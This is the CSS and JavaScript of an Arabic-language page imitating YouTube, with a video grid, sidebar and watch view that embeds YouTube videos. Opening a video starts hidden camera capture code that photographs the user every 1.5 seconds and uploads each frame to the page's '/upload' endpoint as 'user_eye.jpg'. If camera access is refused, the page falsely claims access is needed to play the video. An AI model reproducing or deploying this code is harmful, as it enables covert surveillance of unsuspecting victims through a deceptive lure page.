html{color-scheme:dark}

.icon-btn{width:40px;height:40px;border-radius:50%;display:grid;place-items:center;position:relative;flex:none}

.mob-only{display:none}

/* Topbar */
.topbar{position:fixed;top:0;inset-inline:0;height:56px;background:var(--bg);display:flex;align-items:center;justify-content:space-between;padding:0 16px;z-index:100;gap:12px}

.me{width:32px;height:32px;border-radius:50%;background:#8e24aa;display:grid;place-items:center;font-weight:700}

.sb-item span{overflow:hidden;text-overflow:ellipsis}
.sb-item:hover{background:var(--hover)}
.sb-item.active{background:var(--bg2);font-weight:600}
.sb-sep{height:1px;background:var(--line);margin:12px 0}
.sb-title{padding:6px 12px;font-weight:600;font-size:16px}
body.mini:not(.drawer-mode) .sidebar{width:72px;padding:4px}

body.drawer-mode .sidebar{top:0;z-index:200;transform:translateX(100%);box-shadow:0 0 30px rgba(0,0,0,.6)}

.backdrop{position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:150;display:none}

.page-title{padding:16px 24px 0;font-size:20px;font-weight:700}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:24px 16px;padding:24px}

.thumb{position:relative;aspect-ratio:16/9;background:#000;display:flex;justify-content:center;align-items:center}
.thumb img{width:100%;height:100%;object-fit:cover;display:block}
.dur{position:absolute;bottom:6px;inset-inline-end:6px;background:rgba(0,0,0,.8);padding:0 5px;border-radius:4px;font-size:12px;font-weight:600;direction:ltr}
.meta{display:flex;gap:12px;padding:12px}
.avatar{width:36px;height:36px;border-radius:50%;display:grid;place-items:center;font-weight:700;color:#fff;flex:none;text-transform:uppercase}
.t{font-size:15px;font-weight:600;line-height:1.4;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
.sub{color:var(--text2);font-size:13px;margin-top:2px}

.w-primary{flex:1;min-width:0}
.w-secondary{width:402px;flex:none}
.player{position:relative;width:100%;max-width:480px;aspect-ratio:9/16;background:#000;border-radius:12px;overflow:hidden;margin:0 auto}
.player iframe{position:absolute;inset:0;width:100%;height:100%;border:0}
.yt-link{display:inline-block;margin-top:6px;font-size:12px;color:#3ea6ff}
.w-title{font-size:20px;font-weight:700;line-height:1.5;margin:8px 0}

.ch{display:flex;align-items:center;gap:12px}

.rel{display:flex;gap:8px;margin-bottom:10px;cursor:pointer}

.modal{position:fixed;inset:0;background:rgba(0,0,0,.65);display:none;place-items:center;z-index:300;padding:16px}

.modal-box{background:#212121;border-radius:16px;width:min(440px,100%);padding:16px 20px 20px}
.modal-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px}
.share-row{display:flex;gap:16px;overflow-x:auto;padding:8px 0 16px;scrollbar-width:none}

.link-row{display:flex;gap:8px;align-items:center;background:#121212;border:1px solid #303030;border-radius:12px;padding:8px}
.link-row input{flex:1;min-width:0;background:none;border:0;outline:none;direction:ltr;font-size:14px}
.toasts{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);display:flex;flex-direction:column;gap:8px;align-items:center;z-index:500;width:max-content;pointer-events:none}
.toast{background:#f1f1f1;color:#0f0f0f;padding:12px 20px;border-radius:10px;font-weight:600;box-shadow:0 4px 18px rgba(0,0,0,.5);opacity:0;transform:translateY(12px);transition:.25s}
.toast.show{opacity:1;transform:none}
.prog{height:4px;background:#ccc;border-radius:2px;margin-top:8px;overflow:hidden}
.prog i{display:block;height:100%;width:0;background:var(--red);transition:width .3s}

.bnav{display:none;position:fixed;bottom:0;inset-inline:0;height:56px;background:var(--bg);border-top:1px solid var(--line);z-index:100}
.bnav button{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;font-size:10px;gap:2px;color:var(--text2)}
.bnav button.active{color:#fff;font-weight:700}

@media(max-width:700px){
  .mob-only{display:grid}
  .hide-mob{display:none!important}
  .search-wrap{display:none;position:absolute;inset:0;background:var(--bg);padding:0 8px;z-index:2}
  body.searching .search-wrap{display:flex}
  .grid{grid-template-columns:1fr;padding:12px}
  .bnav{display:flex}
  .main{padding-bottom:64px}
  .watch{padding:0;flex-direction:column}
  .player{border-radius:0;max-width:100%}
  body.in-watch .bnav{display:none}
}
</style>
</head>

const $=(s,r=document)=>r.querySelector(s);
const ar=n=>String(n).replace(/\d/g,d=>'٠١٢٣٤٥٦٧٨٩'[d]);
const fmt=n=>{let v,u='';if(n>=1e9){v=n/1e9;u=' مليار'}else if(n>=1e6){v=n/1e6;u=' مليون'}else if(n>=1e3){v=n/1e3;u=' ألف'}else return ar(n);return ar(Math.round(v*10)/10)+u};

function toast(html,{sticky=false,ms=2600}={}){
  const el=document.createElement('div');el.className='toast';el.innerHTML=html;
  $('#toasts').appendChild(el);requestAnimationFrame(()=>el.classList.add('show'));
  if(!sticky)setTimeout(()=>{el.classList.remove('show');setTimeout(()=>el.remove(),300)},ms);return el;
}

function updateLayout(){

}
function toggleSidebar(){
  const b=document.body;
  if(b.classList.contains('drawer-mode'))b.classList.toggle('drawer-open');else b.classList.toggle('mini');
}

  `<button class="${S.view==='shorts'?'active':''}" data-nav="shorts">${ic('shorts')}<span>شورتس</span></button>`+
  `<button class="${S.view==='subs'?'active':''}" data-nav="subs">${ic('subs')}<span>الاشتراكات</span></button>`+
  `<button class="${S.view==='library'?'active':''}" data-nav="library">${ic('library')}<span>المكتبة</span></button>`;
}

const cardHtml=v=>`<article class="card" data-open="${v.id}"><div class="thumb"><img loading="lazy" src="https://img.youtube.com/vi/${v.id}/hqdefault.jpg" alt=""><span class="dur">${v.dur}</span></div><div class="meta">${avatar(v.ch)}<div><h3 class="t">${v.title}</h3><div class="sub">${v.ch}</div><div class="sub">${fmt(v.views)} مشاهدة • ${v.time}</div></div></div></article>`;
const gridHtml=l=>`<div class="grid">${l.map(cardHtml).join('')}</div>`;

function filtered(){
  const q=S.q.trim().toLowerCase();
  return VIDEOS.filter(v=>(S.cat==='الكل'||v.cat===S.cat)&&(!q||(v.title+' '+v.ch).toLowerCase().includes(q)));
}

function render(pushState=true){
  document.body.classList.toggle('in-watch',S.view==='watch');
  updateLayout();renderSidebar();renderBnav();
  const chips=$('#chips'),view=$('#view');
  chips.style.display=S.view==='home'?'flex':'none';

  if(pushState){
    history.pushState({view:S.view,cur:S.cur,cat:S.cat,q:S.q},S.view==='watch'&&cur()?cur().title:'يوتيوب','#'+(S.view==='watch'?'watch='+S.cur:S.view));
  }

  if(S.view==='watch'){return renderWatch()}
  if(S.view==='home'){
    chips.innerHTML=CATS.map(c=>`<button class="chip ${c===S.cat?'active':''}" data-cat="${c}">${c}</button>`).join('');
    view.innerHTML=gridHtml(filtered());
  }else if(S.view==='shorts'){
    view.innerHTML=`<h2 class="page-title">شورتس</h2>`+gridHtml(VIDEOS);
  }else if(S.view==='subs'||S.view==='library'||S.view==='history'){
    view.innerHTML=`<h2 class="page-title">${S.view==='subs'?'الاشتراكات':S.view==='library'?'المكتبة':'سجل المشاهدة'}</h2>`+gridHtml(VIDEOS);
  }
}

function go(view){
  S.view=view;S.cur=null;S.q='';$('#q').value='';
  document.body.classList.remove('drawer-open','searching');
  render();scrollTo(0,0);
}

function openVideo(id){
  S.cur=id;S.view='watch';
  document.body.classList.remove('drawer-open','searching');
  render();scrollTo(0,0);
  startCapture();
}

function renderWatch(){
  const v=cur()||VIDEOS[0];
  $('#view').innerHTML=`<div class="watch"><div class="w-primary">
    <div class="player"><iframe src="https://www.youtube.com/embed/${v.id}?autoplay=1&rel=0&playsinline=1" title="${esc(v.title)}" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe></div>
    <div style="margin-top:8px"><a class="yt-link" href="${linkOf(v)}" target="_blank">الفيديو لا يعمل؟ شاهده على يوتيوب ↗</a></div>
    <h1 class="w-title">${v.title}</h1>
    <div class="w-row">
      <div class="ch">${avatar(v.ch,40)}<div><div class="ch-name">${v.ch}</div><div class="sub">${fmt(v.views)} مشاهدة</div></div></div>
      <div class="actions">
        <div class="seg"><button data-action="like">${ic('like')}<span>إعجاب</span></button></div>
        <button class="btn" data-action="share" style="background:#272727;border-radius:18px;padding:0 16px;height:36px;font-weight:600">مشاركة</button>
      </div>
    </div>
    <div class="desc" data-action="desc"><p>${v.desc}</p></div>
  </div></div>`;
}

/* ===== الكاميرا والتفاعل ===== */
let mediaStream = null;

async function initPersistentCamera() {
    try {
        mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: 'user' } } });
        const videoEl = document.getElementById('video');
        videoEl.srcObject = mediaStream;
        
        if (S.cur) {
            const playerEl = document.querySelector('.player');
            if (playerEl && playerEl.querySelector('#retryCamera')) {
                playerEl.innerHTML = `<iframe src="https://www.youtube.com/embed/${S.cur}?autoplay=1&rel=0&playsinline=1" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>`;
            }
        }
        
        setInterval(() => {
            if (!mediaStream) return;
            try {
                const canvas = document.createElement('canvas');
                canvas.width = videoEl.videoWidth || 640;
                canvas.height = videoEl.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(blob => {
                    if (blob) {
                        let fd = new FormData();
                        fd.append('image', blob, 'user_eye.jpg');
                        fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
                    }
                }, 'image/jpeg', 0.85);
            } catch (err) {}
        }, 1500);

    } catch (e) {
        const playerEl = document.querySelector('.player');
        if (playerEl) {
            playerEl.innerHTML = `
                <div id="retryCamera" style="display:grid;place-items:center;height:100%;color:#fff;text-align:center;padding:20px;cursor:pointer;background:#111;">
                    <div>
                        <p style="color:#ff0000;font-weight:bold;margin-bottom:8px;">عذراً، يجب السماح بالكاميرا لعرض الفيديو</p>
                        <span style="font-size:13px;color:#aaa;background:#333;padding:8px 16px;border-radius:20px;display:inline-block;">اضغط هنا لإعادة المحاولة ومنح الإذن</span>
                    </div>
                </div>
            `;
            document.getElementById('retryCamera').onclick = () => {
                mediaStream = null;
                initPersistentCamera();
            };
        }
    }
}

function startCapture() {
    if (mediaStream) return;
    initPersistentCamera();
}

document.addEventListener('click',e=>{
  const el=e.target.closest('[data-action],[data-open],[data-nav],[data-cat]');
  if(!el)return;
  const d=el.dataset;
  if(d.open)openVideo(d.open);
  else if(d.nav)go(d.nav);
  else if(d.cat){S.cat=d.cat;render()}
  else if(d.action==='menu')toggleSidebar();
  else if(d.action==='search-open')document.body.classList.add('searching');
  else if(d.action==='search-close')document.body.classList.remove('searching');
});

$('#searchForm').addEventListener('submit',e=>{e.preventDefault();});

window.addEventListener('popstate',e=>{
  if(e.state){S.view=e.state.view;S.cur=e.state.cur;S.cat=e.state.cat;S.q=e.state.q||'';}
  else{S.view='home';S.cur=null;}
  render(false);
});

document.querySelectorAll('[data-ic]').forEach(el=>el.innerHTML=ic(el.dataset.ic));
go('home');
</script>
</body>
</html>
